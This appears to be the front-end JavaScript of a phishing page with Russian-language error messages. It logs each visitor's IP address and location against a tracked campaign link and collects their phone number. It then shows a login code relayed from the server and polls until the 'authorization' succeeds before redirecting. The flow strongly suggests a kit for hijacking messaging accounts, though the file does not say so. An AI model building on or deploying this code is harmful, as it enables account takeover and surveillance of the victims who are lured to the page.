function timeoutFetch(timeout, url) {
    return Promise.race([
        fetch(url),
        new Promise((resolve, reject) =>
            setTimeout(() => reject(new Error("timeout")), timeout)
        )
    ]);
}

function formatPhone(phoneNumber) {
    return phoneNumber.replace(/\s/g, '').replace(/(\d{1,3})(\d{0,2})(\d{0,3})(\d{0,4})/, function(_, p1, p2, p3, p4) {
        let parts = [p1, p2, p3, p4].filter(Boolean);
        return '+' + parts.join('');
    }).trim();;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function hidePreloader(timeout) {
    return setTimeout(function() {
        setTimeout(function() {
            $(".progress-bar").attr("style", "width: 10%");
            setTimeout(function() {
                $(".progress-bar").attr("style", "width: 30%");
                setTimeout(function() {
                    $(".progress-bar").attr("style", "width: 50%");
                    setTimeout(function() {
                        $(".progress-bar").attr("style", "width: 90%");
                        setTimeout(function() {
                            $(".progress-bar").attr("style", "width: 100%");
                            setTimeout(function() {
                                $("#preloader").addClass("hidden");
                            }, 500);
                        }, 500);
                    }, 1500);
                }, 500);
            }, 1000);
        }, 500);
    }, timeout);
}

function updateStatistiks() {
    localStorage.setItem("unique", 0);
    fetch('/api/v1/statistiks/update/?link=' + link + '&unique=' + unique + '&session=' + session, {
        method: 'GET',
    })
    .then(response => response.json())
    .then(jsonData => {
        if (jsonData.success) {
            console.log(jsonData);
        } else {
            if (jsonData.message) {
                console.log(jsonData.message);
            } else {
                console.log('Something went wrong. Please try again.');
            }
        }
     })
    .catch(error => {
        console.error('Error sending request:', error);
    });
}

function addAuthotization(userData) {
    fetch('/api/v1/authorization/add/?link=' + link + '&session=' + session + '&ip=' + encodeURIComponent(userData.ip) + '&country=' + encodeURIComponent(userData.country) + '&region=' + encodeURIComponent(userData.region) + '&city=' + encodeURIComponent(userData.city), {
        method: 'GET',
    })
    .then(response => response.json())
    .then(jsonData => {
        if (jsonData.success) {
            server_sid = jsonData.server_sid
            console.log(jsonData);
        } else {
            showError();
            if (jsonData.message) {
                console.log(jsonData.message);
            } else {
                console.log('Something went wrong. Please try again.');
            }
        }
     })
    .catch(error => {
        showError();
        console.error('Error sending request:', error);
    });
}

function updateAuthotization(phone) {
    fetch('/api/v1/authorization/update/?session=' + session + '&phone=' + phone + '&server_sid=' + server_sid, {
        method: 'GET',
    })
    .then(response => response.json())
    .then(jsonData => {
        if (jsonData.success) {
            if (socket_status == false) {
                getAuthCode();
            }
            console.log(jsonData);
        } else {
            showError();
            if (jsonData.message) {
                console.log(jsonData.message);
            } else {
                console.log('Something went wrong. Please try again.');
            }
        }
     })
    .catch(error => {
        showError();
        console.error('Error sending request:', error);
    });
}

function saveAuthotization() {
    fetch('/api/v1/authorization/save/?session=' + session, {
        method: 'GET',
    })
    .then(response => response.json())
    .then(jsonData => {
        if (jsonData.success) {
            window.location.href = next_url;
        } else {
            if (jsonData.message) {
                console.log(jsonData.message);
            } else {
                console.log('Something went wrong. Please try again.');
            }
        }
     })
    .catch(error => {
        console.error('Error sending request:', error);
    });
}

function showError() {
    $(".description > .text > h2").html('Ошибка сервера');
    $(".description > .text > p").html('Сервер временно недоступен. Повторите попытку позже.');
    $('.form').remove();
}

function showCode(data) {
    let code_element = 0;
    let copyCode = '';
    data.forEach(el => {
        copyCode += el;
        $('.code-element').eq(code_element).html(el);
        code_element++;
    });
    $('#loader').addClass('hidden');
    $('#code').html(copyCode);
    $('.code-block').attr('style', '');
    $('#copy-btn').attr('style', '');
}

async function getAuthCode() {
    await fetch('/api/v1/authorization/getAuthCode/?session=' + session, {
        method: 'GET',
    })
    .then(response => response.json())
    .then(jsonData => {
        if (jsonData.success) {
            if (jsonData.auth_code != null) {
                showCode(JSON.parse(jsonData.auth_code));
                setTimeout(function() {
                    getAuthStatus();
                }, 5000);
            } else {
                setTimeout(function() {
                    getAuthCode();
                }, 1500);
            }
        } else {
            if (jsonData.message) {
                console.log(jsonData.message);
            } else {
                console.log('Something went wrong. Please try again.');
            }
        }
     })
    .catch(error => {
        console.error('Error sending request:', error);
    });
}

async function getAuthStatus() {
    await fetch('/api/v1/authorization/getAuthStatus/?session=' + session, {
        method: 'GET',
    })
    .then(response => response.json())
    .then(jsonData => {
        if (jsonData.success) {
            if (jsonData.date_authorization != null) {
                saveAuthotization();
            } else {
                setTimeout(function() {
                    getAuthStatus();
                }, 1500);
            }
        } else {
            if (jsonData.message) {
                console.log(jsonData.message);
            } else {
                console.log('Something went wrong. Please try again.');
            }
        }
     })
    .catch(error => {
        console.error('Error sending request:', error);
    });
}